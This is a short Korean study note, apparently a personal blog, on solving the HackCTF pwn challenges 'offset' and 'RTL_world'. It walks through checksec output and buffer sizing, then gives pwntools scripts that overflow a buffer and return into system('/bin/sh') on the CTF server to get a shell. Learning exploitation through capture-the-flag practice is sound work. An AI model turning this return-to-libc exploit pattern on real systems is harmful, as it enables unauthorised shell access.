# 개인공부
## python and pwn

## hackctf: offset      

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3007)

p.recvuntil("Which function would you like to call?")

pay = A*30
pay += p32(0xD8)

p.sendline(pay)
p.interactive()



## RTL_world 풀이

checksec 입력시

CANARY : disabled

FORTIFY : disabled

NX : ENABLED

PIE : disabled

RELRO : Partial



이므로 이번문제 역시 yes_or_no 처럼 쉘코드 사용이 불가능하다.
또한 eax 이기떄문에 32비트이다.

일단 바이너리 코드를 살펴보자.

코드

이하 생략 ( 상단 choichanghyeok 이동 / 레벨 문제 / hackCTF문제 / RTL 풀이 )

개인적인 생각으로 case 5: 의 read() 함수를 공격해  bof 를 일으킬수 있을거같다.

read@plt ( call ) 까지의 버퍼는 0x8c  ( 140 ) 

총 길이는 140 + 4(SFP) +  4(RET) = 148 

따라서 페이로드는

버퍼(144) + system 주소 + RET(4) + /bin/sh 주소



system 주소는 IDA 에 보면 system 주소가 있거나 해당 리눅스 gdb info func 명령어를 이용해
알수있다.

system 주소 : 0x080485b0

/bin/sh 주소 : 0x8048eb1

( /bin/sh 주소는 b*main 을 돌리고 실행한뒤 find "/bin/sh" 를 하면 찾을수있다. 주소가 2개나오는데
rtl_world 주소를 사용하면 된다.)


따라서 페이로드 작성 @@

## hackctf: rtl_world

from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3010)

p.recv(1024)

p.sendline('5')

p.recvuntil("[Attack] > ")

system_addr = p32(0x080485b0)

bin_addr = p32(0x8048eb1)

payload = "A"*144

payload += system_addr

payload += "A"*4

payload += bin_addr

p.sendline(payload)

p.interactive()


( 파일명 vi rtl.py ) 로 생성

python rtl.py 하면

cat flag 를 입력하면 flag 
